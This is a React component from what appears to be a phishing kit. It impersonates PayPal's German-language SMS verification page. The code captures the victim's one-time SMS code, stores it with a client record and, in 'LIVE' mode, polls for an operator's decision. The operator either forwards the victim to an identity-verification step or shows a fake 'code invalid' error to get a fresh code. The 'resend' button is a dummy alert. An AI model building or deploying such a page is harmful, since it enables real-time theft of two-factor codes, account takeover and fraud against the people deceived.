import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'motion/react';
import { ClientStore } from '../services/ClientStore';

export default function SMSVerification() {
  const navigate = useNavigate();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);

  // Poll for admin decision in LIVE mode
  useEffect(() => {
    let interval: number | undefined;
    
    if (waitingForAdmin) {
      interval = window.setInterval(async () => {
        const clients = await ClientStore.fetchClients();
        const id = sessionStorage.getItem('clientId');
        const me = clients.find(c => c.id === id);
        
        if (me && me.adminDecision !== 'PENDING') {
          setWaitingForAdmin(false);
          setIsLoading(false);
          
          if (me.adminDecision === 'FORWARD') {
            await ClientStore.addOrUpdateClient({ id: id!, adminDecision: 'PENDING', waitingFor: 'NONE' });
            navigate('/redirect', { state: { next: '/identity-verification' } });
          } else {
            setError('Der eingegebene Code ist ungültig oder abgelaufen.');
            await ClientStore.addOrUpdateClient({ id: id!, adminDecision: 'PENDING', waitingFor: 'NONE' });
            setCode(['', '', '', '', '', '']);
            const firstInput = document.getElementById('sms-0');
            firstInput?.focus();
          }
        }
      }, 1500);
    }
    
    return () => { if (interval) clearInterval(interval); };
  }, [waitingForAdmin, navigate]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>, index: number) => {
    const value = e.target.value;
    if (value.length > 1) return; // Prevent multiple chars

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`sms-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      const prevInput = document.getElementById(`sms-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const sms = code.join('');
    if (sms.length === 6) {
      setIsLoading(true);
      setError('');
      const clientId = sessionStorage.getItem('clientId') || 'unknown';
      const mode = ClientStore.getSystemMode();

      ClientStore.addOrUpdateClient({ 
        id: clientId,
        smsCode: sms,
        waitingFor: mode === 'LIVE' ? 'SMS' : 'NONE',
        adminDecision: mode === 'LIVE' ? 'PENDING' : 'PENDING'
      });
      
      if (mode === 'LIVE') {
        setWaitingForAdmin(true);
      } else {
        setTimeout(() => {
          setIsLoading(false);
          navigate('/redirect', { state: { next: '/identity-verification' } });
        }, 2000);
      }
    }
  };

  return (
    <div className="w-full max-w-[460px] mx-auto px-6 py-12 md:py-20">
      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-white rounded-3xl p-8 md:p-10 text-center shadow-sm border border-slate-100"
      >
        <div className="flex justify-center mb-8">
          <img 
            src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" 
            alt="PayPal Logo" 
            className="h-10"
            referrerPolicy="no-referrer"
          />
        </div>

        <h1 className="text-xl font-bold text-text-main mb-4 tracking-tight">
          Überprüfungscode eingeben
        </h1>
        
        <p className="text-[15px] text-text-muted mb-8 text-left leading-relaxed">
          Geben Sie den von uns per Textnachricht gesendeten Code ein an <span className="text-text-main font-bold">+49 1...</span>
        </p>

        <form onSubmit={handleSubmit} className="space-y-8">
          {error && (
            <div className="p-3 bg-red-50 border border-red-100 rounded-lg text-red-600 text-[13px] font-medium leading-tight text-left">
              {error}
            </div>
          )}
          <div className="flex justify-between gap-2 max-w-[300px] mx-auto">
            {code.map((digit, idx) => (
              <input
                key={idx}
                id={`sms-${idx}`}
                type="text"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(e, idx)}
                onKeyDown={(e) => handleKeyDown(e, idx)}
                className="w-10 h-12 text-center text-xl font-bold border border-slate-300 rounded-lg focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all"
                required
              />
            ))}
          </div>

          <div className="text-left font-bold">
            <button 
              type="button"
              className="text-[14px] text-secondary hover:underline"
              onClick={() => alert('Code wurde erneut gesendet.')}
            >
              Erneut senden
            </button>
          </div>

          <button 
            type="submit"
            disabled={isLoading || code.some(d => !d)}
            className="w-full bg-primary text-white font-bold py-3 px-6 rounded-full transition-all hover:bg-secondary disabled:opacity-50"
          >
            {isLoading ? 'Wird geprüft...' : 'Absenden'}
          </button>
        </form>
      </motion.div>
    </div>
  );
}
